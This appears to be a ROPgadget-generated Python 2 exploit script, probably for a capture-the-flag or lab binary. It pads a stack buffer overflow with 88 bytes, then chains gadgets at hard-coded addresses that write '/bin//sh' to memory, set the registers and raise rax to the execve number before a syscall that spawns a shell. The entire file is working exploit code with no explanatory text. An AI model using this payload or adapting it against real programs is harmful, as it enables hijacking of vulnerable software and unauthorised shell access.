#!/usr/bin/env python2
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = 'a'*88

p += pack('<Q', 0x0000000000401467) # pop rsi ; ret
p += pack('<Q', 0x00000000006b4240) # @ .data
p += pack('<Q', 0x0000000000431ccd) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x00000000004609d1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401467) # pop rsi ; ret
p += pack('<Q', 0x00000000006b4248) # @ .data + 8
p += pack('<Q', 0x000000000041913f) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004609d1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401346) # pop rdi ; ret
p += pack('<Q', 0x00000000006b4240) # @ .data
p += pack('<Q', 0x0000000000401467) # pop rsi ; ret
p += pack('<Q', 0x00000000006b4248) # @ .data + 8
p += pack('<Q', 0x00000000004335f5) # pop rdx ; ret
p += pack('<Q', 0x00000000006b4248) # @ .data + 8
p += pack('<Q', 0x000000000041913f) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454ac0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000455685) # syscall ; ret

print p
